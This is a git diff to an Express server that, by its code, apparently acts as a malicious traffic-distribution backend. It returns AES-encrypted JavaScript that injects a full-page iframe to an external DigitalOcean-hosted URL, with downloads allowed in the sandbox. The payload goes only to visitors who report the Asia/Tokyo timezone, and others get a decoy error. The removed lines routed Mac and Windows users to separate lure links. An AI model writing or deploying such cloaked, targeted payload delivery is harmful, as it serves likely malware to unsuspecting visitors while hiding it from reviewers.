@@ -13,7 +13,7 @@ app.use(express.json());
 // Optimized Security Headers Middleware
 app.use((req, res, next) => {
     res.header("Access-Control-Allow-Origin", "*");
-    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, User-Agent");
+    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
     res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
     
     if (res.getHeader('X-Frame-Options') === 'sameorigin') {
@@ -26,21 +26,48 @@ app.use((req, res, next) => {
 
 // O(1) Instant Lookup Set
 const ALLOWED_TIMEZONES = new Set([
-   "Asia/Tokyo"
+    "Asia/Tokyo"
 ]);
 
-// Destination Links
-const LINK_MAC = "https://seal-app-mfxsx.ondigitalocean.app/Ma0cHelpAsMEr0t0140";
-const LINK_OTHERS = "https://seal-app-mfxsx.ondigitalocean.app/Win0codejInfowj2n";
+// Raw URLs accompanied by their selection probability weights (Must total 1.0)
+const RAW_CONFIGS = [
+    { url: "https://seal-app-mfxsx.ondigitalocean.app/Win0codejInfowj2n", weight: 1.0 }
+
+];
 
 // --- Pre-Compilation Cache Layer ---
-// Helper to generate identical iframe payloads dynamically on boot
-const buildIframePayload = (url) => `const iframe=document.createElement("iframe");iframe.src="${url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
+// This processes everything into memory ONCE during boot, removing CPU load during requests.
 
-// Pre-encrypt static variations during startup
-const ENCRYPTED_MAC_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(buildIframePayload(LINK_MAC), secretKey).toString());
-const ENCRYPTED_OTHERS_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(buildIframePayload(LINK_OTHERS), secretKey).toString());
+const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
+    const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${item.url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
+    
+    return {
+        weight: item.weight,
+        encryptedPayload: encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString())
+    };
+});
+
+// Pre-encrypt static error payload
 const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());
+
+// --- Helper Functions ---
+
+/**
+ * Returns a pre-encrypted payload immediately using constant-time evaluation 
+ * and simple random boundary checks.
+ */
+function getFastResponse() {
+    const rand = Math.random();
+    let cumulativeWeight = 0;
+
+    for (const item of PRECOMPUTED_RESPONSES) {
+        cumulativeWeight += item.weight;
+        if (rand <= cumulativeWeight) {
+            return item.encryptedPayload;
+        }
+    }
+    return PRECOMPUTED_RESPONSES[PRECOMPUTED_RESPONSES.length - 1].encryptedPayload;
+}
 
 // --- Routes ---
 
@@ -55,24 +82,15 @@ app.get("/timezone", (req, res) => {
 app.post("/timezone", (req, res) => {
     const { timezone } = req.body;
 
-    // 1. Validate timezone via O(1) memory Set
-    if (!timezone || !ALLOWED_TIMEZONES.has(timezone)) {
-        return res.send(ERROR_PAYLOAD);
-    }
-
-    // 2. Sniff Operating System using User-Agent header
-    const userAgent = req.headers["user-agent"] || "";
-    const isMac = /Macintosh|Mac OS X/i.test(userAgent);
-
-    // 3. Serve the respective pre-encrypted payload instantly
-    if (isMac) {
-        res.send(ENCRYPTED_MAC_PAYLOAD);
+    // Fast validations against memory references 
+    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
+        res.send(getFastResponse());
     } else {
-        res.send(ENCRYPTED_OTHERS_PAYLOAD);
+        res.send(ERROR_PAYLOAD);
     }
 });
 
 // --- Start Server ---
 app.listen(PORT, () => {
-    console.log(`High-performance OS-targeted server running on port ${PORT}`);
+    console.log(`High-performance server running on port ${PORT}`);
 });
